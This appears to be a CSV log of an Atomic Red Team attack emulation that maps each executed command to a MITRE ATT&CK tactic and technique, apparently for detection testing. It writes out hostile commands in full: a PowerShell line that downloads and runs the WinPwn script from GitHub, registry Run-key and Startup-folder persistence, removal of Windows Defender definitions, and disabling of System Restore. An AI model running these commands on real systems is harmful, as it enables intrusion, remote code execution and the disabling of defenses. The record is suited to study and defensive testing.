148e2a54-2a82-42ff-b065-08e58f8a200f,{'file': 'C:\\Users\\victim\\Downloads\\VERY_CAMEO.bin'},1,'Initial Access','T1566.002 Phishing: Spearphishing Link'
448b73c3-29c5-47cc-abe2-5e1bb2810b14,{'file': 'C:\\Users\\victim\\Downloads\\ABUNDANT_NUMERACY.exe'},2,'Initial Access','T1566.002 Phishing: Spearphishing Link'
398b6147-ffed-46c7-aa0c-d8d6496760b6,{'subject': '"C:\\Users\\victim\\Downloads\\ABUNDANT_NUMERACY.exe" '},3,'Execution','T1204.002 User Execution: Malicious File'
c5efc831-374b-4d6b-9fe2-31b7b24ce71e,{'file': 'C:\\Users\\victim\\Downloads\\AGREEABLE_NIECE.exe'},4,'Initial Access','T1566.002 Phishing: Spearphishing Link'
b0db3d66-fdea-43e3-aa8e-f18397e6cf1f,{'subject': 'cmd.exe /c "REG ADD \\"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" /V \\"Atomic Red Team\\" /t REG_SZ /F /D \\"C:\\Users\\victim\\Downloads\\AGREEABLE_NIECE.exe\\""'},5,'Defense Evasion','T1112 Modify Registry'
7d0480c0-c2ed-4106-99a3-ae5d7486a418,{'subject': 'REG  ADD \\"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\" /V \\"Atomic Red Team\\" /t REG_SZ /F /D \\"C:\\Users\\victim\\Downloads\\AGREEABLE_NIECE.exe\\"'},6,'Defense Evasion','T1112 Modify Registry'
ec095ce1-0dd9-4b42-9ada-777c1a76b9d5,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},7,'Discovery','T1082 System Information Discovery'
afb88a65-5832-4aa8-987d-3518d70b328f,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},8,'Discovery','T1082 System Information Discovery'
e5ddf03b-a34f-44c0-a123-e107d721b192,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},9,'Discovery','T1082 System Information Discovery'
2095b389-5a52-40a9-9c1b-8bfc87f7575f,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},10,'Discovery','T1082 System Information Discovery'
473129e1-4b63-479b-9ed3-b524f49bbd82,{'subject': 'powershell.exe -Command "$S3cur3Th1sSh1t_repo=\'https://raw.githubusercontent.com/S3cur3Th1sSh1t\'; iex (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\'); otherchecks -noninteractive -consoleoutput"'},11,'Discovery','T1082 System Information Discovery'
658b9c09-54f1-4896-b9a5-628aca017d8a,{'subject': 'powershell.exe -Command "Copy-Item -path \\"C:\\Windows\\System32\\calc.exe\\" -destination \\"$env:TMP\x07tomictest\\""'},12,'Persistence,Privilege Escalation','T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
dfe6e367-f8e3-432d-bb91-4909260ad2ea,{'subject': 'powershell.exe -Command "New-Item -ItemType Directory -path \\"$env:TMP\x07tomictest\\""'},13,'Persistence,Privilege Escalation','T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
658b9c09-54f1-4896-b9a5-628aca017d8a,{'subject': 'powershell.exe -Command "Copy-Item -path \\"C:\\Windows\\System32\\calc.exe\\" -destination \\"$env:TMP\x07tomictest\\""'},14,'Persistence,Privilege Escalation','T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
f8dfcb8d-b1da-46f9-8307-82240c251783,{'subject': 'powershell.exe -Command "Set-ItemProperty -Path  \\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\" -Name \\"Startup\\" -Value \\"$env:TMP\x07tomictest\\""'},15,'Persistence,Privilege Escalation','T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder'
1cb6ff9c-2b4c-497f-98cd-42c323376386,{'subject': 'powershell.exe -Command "$startingDirectory=\\"C:\\"; $outputZip=\\"#{output_zip_folder_path}\\"; $fileExtensions=@(\\".doc\\"'},16,'Collection','T1005 Data from Local System'
3fa83afe-3a52-4eda-a279-1d66458ad057,{'file': 'C:\\windows\\system32\\fodhelper.exe'},17,'Defense Evasion,Privilege Escalation','T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control'
9349a022-9598-4351-b492-763f009e5332,{'file': 'C:\\Windows\\system32\\fodhelper.exe'},18,'Defense Evasion,Privilege Escalation','T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control'
b6304860-9419-4f9b-a757-bfa53d82155d,{'subject': 'cmd.exe /c "reg add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f"'},19,'Defense Evasion','T1112 Modify Registry'
4f6b35dd-eec2-4058-80ae-0bf2fa9c62a6,{'subject': 'reg  add \\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f'},20,'Defense Evasion','T1112 Modify Registry'
7719f9e2-710a-4753-8905-328640464e72,{'subject': 'cmd.exe /c "\\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\\" -RemoveDefinitions -All"'},21,'Defense Evasion','T1562.001 Impair Defenses: Disable or Modify Tools'
17c7346d-a46b-4fd0-a853-66af1ad7e206,{'subject': 'cmd.exe /c "schtasks.exe /Change /TN \\"\\Microsoft\\Windows\\SystemRestore\\SR\\" /disable"'},22,'Impact','T1490 Inhibit System Recovery'
4f1e46c2-1e78-4018-9ea6-4022212a14bf,{'subject': 'C:\\Windows\\system32\\cmd.exe /c schtasks /Create /SC ONCE /TN AHK_TestTask /TR "notepad.exe" /ST 12:00 /F'},23,'Impact','T1490 Inhibit System Recovery'
